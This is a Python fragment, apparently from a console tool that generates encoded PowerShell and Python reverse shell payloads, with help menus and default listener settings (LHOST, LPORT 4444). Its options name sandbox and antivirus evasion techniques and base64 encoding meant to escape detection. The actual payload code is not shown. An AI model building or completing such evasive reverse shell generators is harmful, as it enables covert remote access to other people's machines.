reverse_shell = ""
lhost = "192.168.0.101"
lport = int(4444)
encode_type = ""
technique = ""

def reverse_shells():
    print("\nWindows : ")
    print("powershell                                #  OS : Windows(x86, x64), Type : Command line, File type : *.exe")
    print("\nLinux : ")
    print("python                                    #  OS : Linux(x86, x86_64), Type : Command line, File type : *.py\n")
def techniques():
    print("\n(0)   : Don't want to use any technique")
    print("\n(1)   : strstr # Default\n")
    print("(2)   : toomuchmem\n")
    print("(3)   : increment\n")
def encode_types():
    print("\nbase64 *= ( default )\n")
def help():
    print("\nShows :\n")
    print("show reverse_shells                       # Shows reverse_shells list")
    print("show techniques                           # Shows techniques that you can use with reverse_shells to bypass AV's")
    print("show encode_types                         # Shows Encode Types To Escape AV's")
    print("show help                                 # Shows help menu of commands\n\n")
    print("Sets :\n")
    print("set reverse_shell [powershell, python ..] # Sets Reverse Shell")
    print("set LHOST [ip]                            # Sets Local Host")
    print("set LPORT [port]                          # Sets Local Port")
    print("set encode [encode_type]                  # Sets Encode Type Of Reverse Shell\n")
    print("Others: \n")
    print("run                                       # Creates the encoded reverse_shell file if set options is right")
    print("exit                                      # Exits from the script\n")
def exit():
    print("Exit successful !")

